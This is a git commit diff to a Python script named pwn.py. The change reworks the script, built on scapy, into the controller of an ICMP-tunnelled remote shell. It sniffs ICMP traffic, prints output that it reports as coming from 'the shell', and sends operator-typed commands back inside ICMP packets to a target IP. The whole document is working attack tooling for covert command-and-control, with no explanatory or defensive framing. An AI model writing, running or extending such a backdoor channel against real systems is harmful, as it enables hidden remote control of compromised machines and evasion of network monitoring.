fb076171d104667d7d8e6357dda2998cbc454267
RETNUHTROP <porthunter@tuta.io>
2017-07-18 09:15:41 +0200

    Update pwn.py

--- pwn.py
+++ pwn.py
@@ -1,5 +1,4 @@
 from scapy.all import *
-import subprocess
 import sys
 
 interface = sys.argv[1]
@@ -7,20 +6,22 @@ dstip = sys.argv[2]
 
 def pkt_callback(pkt):
 #    pkt.show() # debug statement
-    if pkt[Raw].load == "ls":
-        process = subprocess.Popen(['ls'], stdout=subprocess.PIPE)
-        out, err = process.communicate()
-        print out
-
-        #print "Enter command to execute:"
-        #cmd = raw_input()
-        packet = IP(dst=dstip)/ICMP()/out
+    if pkt[Raw].load == "ECMD":
+        print "Enter command to execute:"
+        cmd = raw_input()
+        packet = IP(dst=dstip)/ICMP()/cmd
         send(packet)
         #packet.show()
 #       print pkt[Raw].load
-
-packet = IP(dst=dstip)/ICMP()/"ECMD"
-send(packet)
-packet.show()
+        print "[!] Command Sent"
+    else:
+        print "[!] We got a connection from the shell, reading packet..."
+        print pkt[Raw].load
+        print "Enter command to execute:"
+        cmd = raw_input()
+        packet = IP(dst=dstip)/ICMP()/cmd
+        send(packet)
+        print "[!] Command Sent"
+        #packet.show()
 
 sniff(iface=interface, prn=pkt_callback, filter="icmp", store=0)
